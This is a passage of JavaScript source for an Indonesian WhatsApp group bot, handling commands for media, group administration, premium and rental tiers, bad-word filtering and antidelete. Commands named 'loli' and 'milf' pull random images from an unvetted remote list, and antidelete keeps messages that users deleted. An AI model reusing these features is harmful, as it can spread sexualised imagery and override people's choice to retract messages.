  ini_txt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${x.jarak}\n`
  ini_txt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
  ini_txt += `  ╭───────────────❏\n`
  ini_txt += `❍┤ Kereta Api : ${x.kereta_api}\n`
  ini_txt += `❍┤ Pesawat : ${x.pesawat}\n`
  ini_txt += `❍┤ Moil : ${x.moil}\n`
  ini_txt += `❍┤ Motor : ${x.motor}\n`
  ini_txt += `❍┤ Jalan Kaki : ${x.jalan_kaki}\n`
  ini_txt += `  ╰───────────────❏\n`
  reply(ini_txt)
  limitAdd(sender, limit)
    })
   .catch((err) => {
   reply(`Error, Mungkin Nama Kota Tidak Di Temukan`)
    })
    break
   case 'waifu':
   case 'loli':
   case 'husbu':
   case 'milf':
   case 'cosplay':
   case 'wallml':{
    if (!isUser) return reply(mess.noregis)
    if (isBan) return reply(mess.ban)
    if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
    reply(mess.wait)
    let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
    let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
    fs.writeFileSync(`./image/anime/${sender}.jpeg`, await getBuffer(wipi))
    const gambra = await YANZ.prepareMessage(from, fs.readFileSync(`./image/anime/${sender}.jpeg`), MessageType.image, {thumbnail: gambar})
    const buttonsss = [{buttonId:`${prefix+command}`,buttonText: {displayText: '➡️ NEXT ➡️'}, type: 1}]
    const ButtonsMessages = {
    contentText: `Wangy Wangyyy`,
    buttons: buttonsss,
    footerText: `Klik Next Untuk Melanjutkan Ke Gambar Berikutnya`,
    headerType: 4,
    imageMessage: gambra.message.imageMessage
    }
    await YANZ.sendMessage(from, ButtonsMessages, MessageType.buttonsMessage, {quoted : mek})
    fs.unlinkSync(`./image/anime/${sender}.jpeg`)
    }
    limitAdd(sender, limit)
    break
  case 'asupan':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
  reply(mess.wait)
  data = fs.readFileSync('./lib/asupan.js');
  jsonData = JSON.parse(data);
  randIndex = Math.floor(Math.random() * jsonData.length);
  randKey = jsonData[randIndex];
  p = await getBuffer(randKey.result)
  YANZ.sendMessage(from, p, video, { quoted:  mek, mimetype: 'video/mp4', caption: '𝙉𝙄𝙃 𝘼𝙎𝙐𝙋𝘼𝙉'})
  limitAdd(sender, limit)
  }
  break
  case 'meme': case 'memeindo':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  reply(mess.wait)
  sendFileFromUrl(`https://lolhuman.herokuapp.com/api/meme/memeindo?apikey=${lolkey}`, image, {quoted:mek})      
  break
  case 'delete':
  case 'del':
  case 'd':
  if (!isGroup)return reply(mess.only.group)
  if (!isGroupAdmins && !isOwner)return reply(mess.only.admin)
  if (!isQuotedReply) return reply(`Reply pesan dari bot!!`)
  YANZ.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
  break
  case 'afk':
  if (!isGroup) return reply(mess.only.group)
  if (isAfkOn) return reply('afk sudah diaktifkan sebelumnya')
  if (body.slice(150)) return reply('Alasan lu kepanjangan Coy')
  let reason = body.slice(5) ? body.slice(5) : 'Gak jelas.'
  afk.addAfkUser(sender, Date.now(), reason, _afk)
mentions(`─「 *AFK MODE* 」─

@${sender.split('@')[0]} sedang afk!
Alasan : ${reason}`, [sender], true)
  break
  case 'delvote': case 'dellvote':
  if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
  if (!isVote) return reply('Tidak ada sesi Voting')
  delVote(from)
  reply('Sukses Menghapus sesi Voting Di Grup Ini')
  break
  case 'voting': case 'vote':
  if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
  if (!isGroup) return reply(mess.only.group)
  if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
  if (!q) return reply(`*Example :*\n ${prefix + command} @tag target | reason  | 1 (1 = 1 Menit)`)
  if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
  let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
  split = args.join(' ').replace('@', '').split('|')
  if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
  await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai!' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
  addVote(from,split[1],split[0],split[2],reply)
  }
  break
  case 'sewabot':
  const buttons = [{buttonId: `${prefix}donasi`, buttonText: {displayText: 'DONASI ☕'}, type: 1},{buttonId: `${prefix}owner`, buttonText: {displayText: 'OWNER👤'}, type: 1}]
  const buttonMessage = {
  headerType: "IMAGE",
  contentText: `${mess.sewabot}`,
  footerText: `selamat ${waktoo}` +' ✨',
  buttons: buttons,
  headerType: 1
  }
  await YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted:mek})
  break
   case 'join':  case 'joingc':
   if (!q) return reply('Linknya?')
   if (isOwner) {
   if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Kak')
   reply('Please waitt...')
   link = args[0].replace('https://chat.whatsapp.com/','')
   fak = YANZ.query({ json: ['action', 'invite', link],
   expect200: true })
   reply('Berhasil Masuk Grup')
   } else {
   const buttons = [{buttonId: `${prefix}sewabot`, buttonText: {displayText: 'SEWA'}, type: 1}]
   const buttonMessage = {
   headerType: "IMAGE",
   contentText: `Hai Kak, Fitur Ini Hanya Bisa Di Gunakan Oleh Owner`,
   footerText: 'ingin sewa? klik di bawah',
   buttons: buttons,
   headerType: 1
   }
   await YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage)
   }
   break
   case 'kick':
   case 'tendang':
   case 'headsot':
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin) 
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   kick(from, mentionUser)
   break
   case 'rkick':
   if (!isGroup) return reply(mess.group)
   if (!itsMe && !isGroupAdmins) return reply(mess.admin)
   if (!isBotGroupAdmins) return reply(mess.Badmin)
   case 'revoke': case 'resetlinkgc': case 'resetlink':
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)           
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   YANZ.query({ json: ['action', 'inviteReset', from], expect200: true })
   reply(`Sukses Reset Link Group!`)
   break
   case 'linkgc': case 'gclink': case 'linkgrup': case 'gruplink': case 'linkgrub': case 'grublink': case 'linkgroup': case 'grouplink':
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)           
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   linkgc = await YANZ.groupInviteCode (from)
  yeh = `*https://chat.whatsapp.com/${linkgc}*`
  YANZ.sendMessage(from, {text: yeh,
  matchedText: 'https://chat.whatsapp.com/' + linkgc, 
  canonicalUrl: `https://chat.whatsapp.com/${linkgc}`, 
   description: `https://chat.whatsapp.com/${linkgc}`, 
  title: `${groupName}`, 
  jpegThumbnail: gambar}, 'extendedTextMessage', { detectLinks: false, contextInfo: {mentionedJid: [yeh]}, quoted: mek})
  break
  //Ambil Case Kasih Credits Gw Dong : FARID MHRDKAA
  case 'add':
  try {
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)           
  if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
  if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
  entah = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
  response = await YANZ.groupAdd(from, [entah])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
if(inv[0].code == 403) return reply('Gagal, Karena Di Private T_T')
if(inv[0].code == 408) return reply('Gagal, Karena Target Baru² Saja Keluar')
if(inv[0].code == 401) return reply('Gagal, Karena Bot Di Block Oleh Target T_T')
} else {
  entah = mek.message.extendedTextMessage.contextInfo.participant
 response = await YANZ.groupAdd(from, [entah])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
if(inv[0].code == 403) return reply('Gagal, Karena Di Private T_T')
if(inv[0].code == 408) return reply('Gagal, Karena Target Baru² Saja Keluar')
if(inv[0].code == 401) return reply('Gagal, Karena Bot Di Block Oleh Target T_T')
}
} catch {
return 
}
  break
case 'setthumb':
case 'setthum':
if (!isOwner) return reply(mess.only.owner)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await YANZ.downloadMediaMessage(boij)
fs.writeFileSync('./image/logo.jpeg', delb)
matanecok = fs.readFileSync('./image/logo.jpeg')
await sleep(5000)
reply(`Sukses`)
break      
case 'setthumb2':
case 'setthum2':{
if (!isOwner) return reply(mess.only.owner)
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await YANZ.downloadMediaMessage(boij)
fs.writeFileSync('./image/logo2.jpeg', delb)
matanecok = fs.readFileSync('./image/logo2.jpeg')
await sleep(5000)
reply(`Sukses`)
}
break      
case 'auto':{
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!q) return 
if (
args[0].toLowerCase() === 'ngetik' ||
args[0].toLowerCase() === 'ketik' ||
args[0].toLowerCase() === 'typing'
){
ngetik = true
autovn = false
reply(`Sukses....`)
} else if (
args[0].toLowerCase() === 'voicenote' ||
args[0].toLowerCase() === 'vn' 
){
ngetik = false
autovn = true
reply(`Sukses...`)
} else {
}
}
break
//MAU NYOLONG CASE KASIH NAMA GW LAH BEHHHH (FARID MAHARDIKA)
case 'changeprefix': case 'setprefix':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!q) return 
if (
args[0].toLowerCase() === 'multi' ||
args[0].toLowerCase() === 'all' ||
args[0].toLowerCase() === 'allprefix' ||
args[0].toLowerCase() === 'multiprefix'
){
multiprefix = true
nopref = false
reply(`Berhasil Mengubah Prefix Ke *MULTI PREFIX*`)
} else if (
args[0].toLowerCase() === 'nopref' ||
args[0].toLowerCase() === 'no' ||
args[0].toLowerCase() === 'nonpref'
){
multiprefix = false
nopref = true
reply(`Berhasil Mengubah Prefix Ke *NO PREFIX*`)
} else if(args[0] === `${q}`){
if (q.length > 2) return reply(`Maximal 1 angka/huruf!!`)
multiprefix = false
nopref = false
prefa = `${args[0]}`
reply(`Berhasil Mengubah Prefix Ke *${q}*`)
}
break
case 'setnamabot':{
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} MuzzaBot`)
 YANZ.updateProfileName(q)
  .then((res) => reply('𝗦𝗲𝗹𝗲𝘀𝗮𝗶 𝗞𝗮𝗸!!'))
				.catch((err) => reply('_𝙴𝚁𝚁𝙾𝚁 !!_'))
            }
  break
   case 'setbiobot':{
   if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
   if (args.length < 1) return reply(`Kirim perintah ${command} nama\n\nContoh : ${command} MuzzaBot`)
   YANZ.setStatus(q)
   .then((res) => reply('𝗦𝗲𝗹𝗲𝘀𝗮𝗶 𝗞𝗮𝗸!!'))
   .catch((err) => reply('_𝙴𝚁𝚁𝙾𝚁 !!_'))
   }
   break
  case 'grup':
  case 'grub':
  case 'groub':
  case 'group':
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins) return reply(mess.only.admin)
  if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
  if (args[0] === "buka") {
  YANZ.groupSettingChange(from, GroupSettingChange.messageSend, false)
  } else if (args[0] === "tutup") {
  YANZ.groupSettingChange(from, GroupSettingChange.messageSend, true)
  } else {
  const buttons = [{buttonId: `${prefix}grup buka`, buttonText: {displayText: 'BUKA'}, type: 1},{buttonId: `${prefix}grup tutup`, buttonText: {displayText: 'TUTUP'}, type: 1}]
  const buttonMessage = {
  headerType: "IMAGE",
  contentText: `GROUP SETTING`,
  footerText: `Pilih Di Bawah `,
  buttons: buttons,
  headerType: 1
  }
  YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
  }
  break 
   case 'promote':
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
   if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
   entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
   if (entah.length > 0) {
   var mems_ids = []
   for (let ids of entah) {
   mems_ids.push(ids)
   }
   YANZ.groupMakeAdmin(from, mems_ids)
   } else {
   YANZ.groupMakeAdmin(from, entah)
   }
   } else {
   entah = mek.message.extendedTextMessage.contextInfo.participant 
   YANZ.groupMakeAdmin(from, [entah])
   }
   break
   case 'demote':
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
   if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
   entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
   if (entah.length > 0) {
   var mems_ids = []
   for (let ids of entah) {
   mems_ids.push(ids)
   }
   YANZ.groupDemoteAdmin(from, mems_ids)
   } else {
   YANZ.groupDemoteAdmin(from, [entah[0]])
   }
   } else {
   entah = mek.message.extendedTextMessage.contextInfo.participant
   YANZ.groupDemoteAdmin(from, [entah])
   }
   break
   case 'setnamagrup':
   case 'setnamegrup':
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (args.length == 0) return reply(`Penggunaan ${prefix}setgrupname name`)
   YANZ.groupUpdateSubject(from, q)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
   break
   case 'setdesc': case 'setdesk': case 'setdeskripsi':
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (args.length == 0)  return reply(`Penggunaan ${prefix}setdesc desc`)
   YANZ.groupUpdateDescription(from, q)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
   break
  case 'setppbot':
  if (!isOwner && !mek.key.fromMe) return
   
  if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
  enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
  media = await YANZ.downloadAndSaveMediaMessage(enmedia)
  await YANZ.updateProfilePicture(botNumber, media)
  reply('Makasih profil barunya😗')
  break
   case 'setppgrup':
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (isQuotedImage) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
   let media = await YANZ.downloadMediaMessage(encmedia)
   YANZ.updateProfilePicture(from, media)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
   } else if (isQuotedSticker){
   if (mek.message.videoMessage) return reply('Error Bro Wkwkwk')
   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   media = await YANZ.downloadAndSaveMediaMessage(encmedia)
   ran = getRandom('.png')
   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
   fs.unlinkSync(media)
   if (err) return reply('Gagal, hehehe')
   buffer = fs.readFileSync(ran)
   YANZ.updateProfilePicture(from, buffer)
   fs.unlinkSync(ran)
   })
   } else {
   reply(`Kirim atau tag gambar/sticker dengan caption ${prefix}setppgrup ya sayang 💕`)
   }
   break
    case 'daftar':
    case 'verify':
    case 'register':
    case 'registrasi':{
    if (isUser) return reply('Kamu Sudah Pernah Melakukan Registrasi Sebelumnya..')
    try {
    ppimk = await YANZ.getProfilePicture(`${sender.split('@')[0]}@c.us`)
    } catch {
    ppimk = `${imagebb}`
    }
    const serialUser = createSerial(10)
   addRegisterUser(sender, pushname, `20`, time, serialUser)
   daftar=`─ 「 *REGISTRATION* 」 ─

⬡ NAMA : ${pushname}
⬡ NOMOR : ${sender.split("@")[0]}
⬡ SN : ${serialUser}
⬡ REGIST TIME :
   - Hours : ${time} Wib
   - Date : ${date}`
  ppimg = await getBuffer(ppimk)
  await YANZ.sendMessage(from, ppimg, MessageType.image, {quoted: mek, caption: daftar, contextInfo: {"mentionedJid": [nomerowner+'@s.whatsapp.net'] }})
  addLevelingId(sender)
 }
 break
  case 'premium': case 'prem':
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  if (args[0].startsWith('08')) return reply(`GUNAKAN KODE NEGARA!!\nEXAMPLE : ${prefix + command} add/dell 6283146208804`)
  if (args[0].startsWith("+62")) return reply(`EXAMPLE : ${prefix + command} add/dell 6283146208804`)
  const arx = body.split(' ')
  if (arx[1] == 'add') {
  _prem.addPremiumUser(arx[2].replace("@","")+ '@s.whatsapp.net', args[2], premium)
  reply(`⬣ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗔𝗗𝗗𝗘𝗗 ⬣

➸ *USER : @${arx[2].replace("@","")}*
➸ *NOMOR : ${arx[2].replace("@","")}*

EXPIRED :
 ◦ ${ms(toMs(args[2])).days} Hari
 ◦ ${ms(toMs(args[2])).hours} Jam
 ◦ ${ms(toMs(args[2])).minutes} Menit
 ◦ ${ms(toMs(args[2])).seconds} Detik`)
  replybutton(arx[2].replace("@","")+'@s.whatsapp.net', `${prefix}cekprem`,`Klik Di Bawah Untuk Mengecek Waktu Expired`, `CEK PREM`, `*KAMU SEKARANG ADALAH USER PREMIUM*`)
  } else if (arx[1] == 'dell') {
  premium.splice(_prem.getPremiumPosition(arx[2].replace("@","") + '@s.whatsapp.net', premium), 1)
   fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
  reply('Done...')
  } else {
  YANZ.sendMessage(`${nomerowner}@s.whatsapp.net`, `*FORMAT SALAH!!*\n\nEXAMPLE : \n${prefix + command} add @TAG TARGET waktu\nUNTUK MENAMBAHKAN USER KE DATA USER PREMIUM\n─ ─ ─\n${prefix + command} dell @TAG TARGET\nUNTUK MENGHAPUS USER DARI DATA USER PREMIUM\n─ ─ ─\nD = DAYS/HARI\nH = HOUR/JAM\nM = MINUTE/MENIT\nS = SECOND/DETIK\n\n*JADI UNTUK WAKTUNYA KAMU ISI TERSERAH SESUAI KEMAUAN KAMU, CONTOH 1D BERARTI 1HARI. DST*`, MessageType.text, {quoted:mek})
  }
  break
  case 'cekprem': case 'premcek': case 'cekpremium': case 'premiumcek':
  if (!isPrem) return reply(`Kamu bukan user premium\nkirim perintah */daftarprem* untuk membeli premium`)
  let cek = ms(getPremiumExpired(sender, premium) - Date.now())
  let premiumnya = `➸ *EXPIRED :*
◦ ${cek.days} Hari
◦ ${cek.hours} Jam
◦ ${cek.minutes} Menit
◦ ${cek.seconds} Detik`
  reply(`${isOwner?'UNLIMITED OWNER':premiumnya}`)
  break
  case 'listprem': case 'listpremium': case 'premiumlist': case 'premlist':
  if (!isOwner && !mek.key.fromMe) return
  let txt = `「 LIST PREMIUM 」\n\n*➛ JUMLAH :* ${premium.length}\n\n`
  let men = [];
  for (let i of premium){
  men.push(i.id)
  let cekvip = ms(i.expired - Date.now())
  txt += `*⬡ NOMOR : ${i.id.split("@")[0]}*\n*⬡ USER : @${i.id.split("@")[0]}*\n- EXPIRED : ${cekvip.days} Hari, ${cekvip.hours} Jam, ${cekvip.minutes} Menit, ${cekvip.seconds} Detik\n─ ─ ─ ─ ─\n`
  }
  reply(`${txt}`)
  break
  case 'extend': case 'perpanjang':
  if (!isSewa) return reply('Only User Rental Bot, Ingin Sewa? klik #sewabot')
  reply('Wait Kak!!\nSaya Bilangin Ke Owner Dulu Hehehe')
  YANZ.sendMessage(`${nomerowner}@s.whatsapp.net`, `Hai Kak, @${sender.split("@")[0]} Mau Memperpanjang Waktu Rental Bot`, text, {contextInfo: {"mentionedJid" : [sender]}})
  break
  case 'sewa':{
  if (!isOwner && !mek.key.fromMe) return reply(mess.sewabot)
  if(!isGroup) return reply('Group Only Ngentod!!!')
  if (args[0].toLowerCase() === 'add') {
  _sewa.addSewaGroup(from, args[1], sewa)
  reply(`Succes...`)
  } else if (args[0].toLowerCase() === 'dell') {
  sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
  fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
  reply(`Succes...`)
  } else {
  }
  }
  break
  case 'sewalist': 
  case 'listsewa':
  if (!isOwner && !mek.key.fromMe) return
  let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
  for (let i of sewa){
  let cekvipp = ms(i.expired - Date.now())
  txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
  }
  reply(txtnyee)
  break
  case 'sewacheck':
  case 'ceksewa': 
  case 'sewacek':
  if (!isGroup) return reply(mess.only.group)
  if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
  let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
  let sewenye = `「 *SEWA EXPIRE* 」

➸ *ID*: ${from}
➸ *EXPIRE :* ${cekvip.days} Hari, ${cekvip.hours} Jam, ${cekvip.minutes} Menit, ${cekvip.seconds} Detik`
  reply(sewenye)
  break
  case 'antibadword': case 'nobadword':
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
  if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group`)
  if (args.length === 0) return reply(`Pilih enable atau disable`)
  if (args[0] == 'on'){
  if (isBadword) return reply(`Udah aktif`)
  grupbadword.push(from)
  fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
  reply(`antibadword grup aktif, kirim ${prefix}listbadword untuk melihat list badword`)
  } else if (args[0] == 'off'){
  anu = grupbadword.indexOf(from)
  grupbadword.splice(anu, 1)
  fs.writeFileSync('./database/grupbadword.json', JSON.stringify(grupbadword))
  reply('antibadword grup nonaktif')
  } else {
 const buttons = [{buttonId: `${prefix}antibadword on`, buttonText: {displayText: 'ON'}, type: 1},{buttonId: `${prefix}antibadword off`, buttonText: {displayText: 'OFF'}, type: 1}]
  const buttonMessage = {
  headerType: "IMAGE",
  contentText: `PILIH ON UNTUK MENGAKTIFKAN\nPILIH OFF UNTUK MEMATIKAN`,
  footerText: `Pilih Di Bawah Ini `,
  buttons: buttons,
  headerType: 1
  }
  YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
  }
  break
  case 'listbadword':
  if (isBan) return
  let bi = `List badword\n\n`
  for (let boo of badword){
  bi += `- ${boo}\n`
  }
  bi += `\nTotal : ${badword.length}`
  reply(bi)
  break
  case 'addbadword':
  if (!isOwner && !mek.key.fromMe)return reply(mess.only.owner) 
  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
  if (isKasar(args[0].toLowerCase(), badword)) return reply(`Udah ada`)
  addBadword(args[0].toLowerCase(), badword)
  reply(`Sukses`)
  } else {
  if (isKasar(mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)) return reply(`Udah ada`)
  addBadword(mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)
  reply(`Sukses`)
  }
  break
  case 'delbadword':{
  if (!isOwner && !mek.key.fromMe)return reply(mess.only.owner) 
  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) {
  if (!isKasar(args[0].toLowerCase(), badword)) return reply(`Ngga ada di listbadword`)
  delBadword(args[0].toLowerCase(), badword)
  reply(`Sukses`)
  } else {
  if (!isKasar(mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)) return reply(`Ngga ada di listbadword`)
  delBadword(mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation.toLowerCase(), badword)
  reply(`Sukses`)
  }
  }
  break
  case 'clearbadword':
  if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  if (!m.quoted) return reply(`Reply Pesan Target!`)
  entah = mek.message.extendedTextMessage.contextInfo.participant
  delCountKasar(entah, senbadword)
  reply(`Sukses Clear Badowrd ${entah}`)
  break
    case 'antidelete':
    if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply(mess.only.admin)
    if (args.length < 1) return reply(`─ ❲ ERROR ❳ ─

Penggunaan fitur antidelete :
*${prefix}antidelete [on/off]* (Untuk grup)
*${prefix}antidelete [cton/ctoff]* (untuk semua kontak)
*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`)
    if (args[0].toLowerCase() === 'on') {
    if (isGroup) {
    if (isRevoke) return reply(`Antidelete telah diaktifkan di grup ini sebelumnya!`)
    dataRevoke.push(from)
    fs.writeFileSync('./database/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
    reply(`Antidelete diaktifkan di grup ini!`)
    } else if (!isGroup) {
    reply(`Untuk kontak penggunaan *${prefix}antidelete ctaktif*`)
    }
    } else if (args[0].toLowerCase() === 'cton') {
      if (!isOwner && !mek.key.fromMe) return reply(mess.OnlyOwner)
    	if (!isGroup) {
    		if (isCtRevoke) return reply(`Antidelete telah diaktifkan di semua kontak sebelumnya!`)
    		dataCtRevoke.data = true
    		fs.writeFileSync('./database/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
    		reply(`Antidelete diaktifkan disemua kontak!`)
    	} else if (isGroup) {
    		reply(`Untuk grup penggunaan *${prefix}antidelete aktif*`)
    	}
    } else if (args[0].toLowerCase() === 'banct') {
if (!isOwner && !mek.key.fromMe) return reply(mess.OnlyOwner)
    	if (isBanCtRevoke) return reply(`kontak ini telah ada di database banlist!`)
    	if (args.length === 1 || args[1].startsWith('0')) return reply(`Masukan nomer diawali dengan 62! contoh 62859289xxxxx`)
    	dataBanCtRevoke.push(args[1].replace("@","") + '@s.whatsapp.net')
    	fs.writeFileSync('./database/ct-revoked-banlist.json', JSON.stringify(dataBanCtRevoke, null, 2))
    	reply(`Kontak ${args[1].replace("@","")} telah dimasukan ke banlist antidelete secara permanen!`)
    } else if (args[0].toLowerCase() === 'off') {
    	if (isGroup) {
    		const index = dataRevoke.indexOf(from)
    		dataRevoke.splice(index, 1)
    		fs.writeFileSync('./database/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))
    		reply(`Antidelete dimatikan di grup ini!`)
    	} else if (!isGroup) {
    		reply(`Untuk kontak penggunaan *${prefix}antidelete ctmati*`)
    	}
    } else if (args[0].toLowerCase() === 'ctoff') {
if (!isOwner && !mek.key.fromMe) return reply(mess.OnlyOwner)
    	if (!isGroup) {
    		dataCtRevoke.data = false
    		fs.writeFileSync('./database/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))
    		reply(`Antidelete dimatikan disemua kontak!`)
    	} else if (isGroup) {
    		reply(`Untuk grup penggunaan *${prefix}antidelete mati*`)
    	}
} else {
 reply(`─ ❲ ERROR ❳ ─

Penggunaan fitur antidelete :
*${prefix}antidelete [on/off]* (Untuk grup)
*${prefix}antidelete [cton/ctoff]* (untuk semua kontak)
*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`)
    }
    break
  //Ambil Case Kasih Credits Gw Dong : Herman Chanel
 case 'antilink':{
   try {
   if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)
   if (args[0].toLowerCase() === 'on'){
   if (isAntiLink) return reply(`Sudah Di Aktifkan Sebelumnya!`)
   antilink.push(from)
   fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
   reply(`Succes mengaktifkan Fitur Antilink`)
   } else if (args[0].toLowerCase() === 'off'){
   if (!isAntiLink) return reply(`Fitur Ini Belum Pernah Di Aktifkan Di Group Ini`)
   var au = antilink.indexOf(from)
   antilink.splice(au, 1)
   fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
  reply(`Succes Mematikan Fitur Antilink`)
  }
  } catch {
  const buttons = [{buttonId: `${prefix}antilink on`, buttonText: {displayText: 'ON'}, type: 1},{buttonId: `${prefix}antilink off`, buttonText: {displayText: 'OFF'}, type: 1}]
  const buttonMessage = {
  headerType: "IMAGE",
  contentText: `PILIH ON UNTUK MENGAKTIFKAN\nPILIH OFF UNTUK MEMATIKAN`,
  footerText: `Pilih Di Bawah Ini 👇`,
  buttons: buttons,
  headerType: 1
  }
  YANZ.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {quoted: mek})
  }
  }
   break
   case 'autoupdatebio':
